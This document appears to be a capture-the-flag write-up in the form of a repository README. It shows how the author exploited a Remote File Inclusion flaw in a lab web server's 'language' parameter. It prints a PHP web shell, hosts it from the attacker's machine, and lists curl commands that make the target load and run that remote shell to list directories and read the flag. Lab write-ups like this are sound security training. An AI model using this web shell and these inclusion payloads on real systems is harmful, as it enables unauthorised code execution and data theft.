# RFI Exploit Write-Up (Target: 10.129.29.114)

This repository documents the exploitation of a Remote File Inclusion (RFI) vulnerability on the web server at `10.129.29.114` to achieve remote code execution (RCE) and locate a flag in a Capture The Flag (CTF) challenge.

## Overview
The target web application at `http://10.129.29.114/index.php` has an RFI vulnerability in the `language` parameter, allowing inclusion of remote PHP scripts. By hosting a malicious PHP script on my machine (`10.10.14.179`), I executed commands and found the flag in `/exercise/flag.txt`.

## Prerequisites
- A Linux machine with Python 3 and curl.
- A malicious PHP script (`shell.php`).
- Network access to the target (`10.129.29.114`).

## Steps

### Step 1: Verify Remote File Inclusion (RFI)
```bash
http://10.129.29.114/index.php?language=http://10.10.14.179/index.php
```
![image](https://github.com/user-attachments/assets/43a2bcde-5069-45e1-a231-14088f58c2d8)

### Step 2: Create and Host the Malicious PHP Script
I created a PHP web shell to execute system commands:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
I hosted the script using a Python HTTP server on port 80 (my IP: 10.10.14.179):
```bash
sudo python3 -m http.server 80
```
### Step 3: Verify Remote Code Execution

I tested the RFI vulnerability by including shell.php and running the id command:
```bash
curl -s "http://10.129.29.114/index.php?language=http://10.10.14.179:80/shell.php&cmd=id" | grep uid
```
![image](https://github.com/user-attachments/assets/298834b5-eb02-4d30-93da-947cee4ddc06)

This confirmed RCE as the www-data user.

### Step 4: Explore the File System

I listed the root directory to identify potential flag locations:

```bash
curl -s "http://10.129.29.114/index.php?language=http://10.10.14.179:80/shell.php&cmd=ls%20/"
```
![image](https://github.com/user-attachments/assets/2be6a63f-ef77-4b93-adbe-d9ac293a27cb)

### Step 5: Locate the Flag
```bash
curl -s "http://10.129.29.114/index.php?language=http://10.10.14.179:80/shell.php&cmd=ls%20/<directory_name>/"
curl -s "http://10.129.29.114/index.php?language=http://10.10.14.179:80/shell.php&cmd=cat%20/<directory_name>/flag.txt"
```
## Files
`shell.php`: Malicious PHP script used for RCE.
